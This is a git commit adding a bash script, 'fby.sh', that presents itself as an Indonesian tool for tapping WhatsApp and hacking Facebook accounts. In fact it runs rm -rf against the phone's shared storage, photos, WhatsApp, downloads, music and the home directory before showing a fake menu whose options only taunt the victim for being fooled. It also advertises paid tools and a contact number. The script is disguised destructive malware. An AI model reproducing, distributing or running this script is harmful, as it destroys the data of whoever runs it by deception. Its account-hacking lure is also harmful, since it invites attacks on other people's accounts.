0abe4821c8877388721679622c04d8277230d13d
DarkGans <56784467+DarkGans@users.noreply.github.com>
2019-11-03 12:47:09 +0700

    Add files via upload

---
+++ fby.sh
@@ -0,0 +1,63 @@
+#!/bin/bash
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #purple
+ku='\033[33;1m' #kuning
+clear
+sleep 1
+echo "Loanding..."
+sleep 2
+clear
+echo $me " •------» " $cy" [Medan Cyber Network22] " $me " «------• "
+echo
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
+rm -rf /storage/emulated/0/Foto
+rm -rf /sdcard/0/Foto
+echo
+echo $ku " ["•$cy "DILARANG KERAS UNTUK ME RECORDE "
+echo $ku " ["•$cy "ADMIN COWOK "
+echo $ku " ["•$cy "MEMBUAT LEBIH SUSAH DARI PADA MENGGGUNAKAN "
+echo $ku " ["•$cy "TEAM KAMI OPEN MEMBER "
+echo $ku " ["•$cy "HUBUNGI: 089613616928 "
+echo $ku " ["•$cy "TOOLS DI PEBARUI SETIAP MINGGU "
+echo $ku " ["•$cy "NOT FREE "
+echo $ku " ["•$cy "NOT FREE "
+sleep 6
+clear
+sleep 2
+clear
+echo
+echo $pur"╔═══════════════════════════╗"
+echo $pur"║"$ku "[1]"$cy "SADAP WHATSAPP VIP.07"$pur" ║  "
+echo $pur"╚═══════════════════════════╝"
+echo
+echo $pur"╔═══════════════════════════╗"
+echo $pur"║"$ku "[2]"$cy "HACK FACEBOOK TARGET"$pur"  ║   "
+echo $pur"╚═══════════════════════════╝"
+read -p "╰┈─➤ " pilih
+if
+[ $pilih = 1 ]
+then
+echo "TAPI BO'ONG"
+fi
+
+if
+[ $pilih = 2 ]
+then
+echo "WKWKW KENA TIPU"
+fi
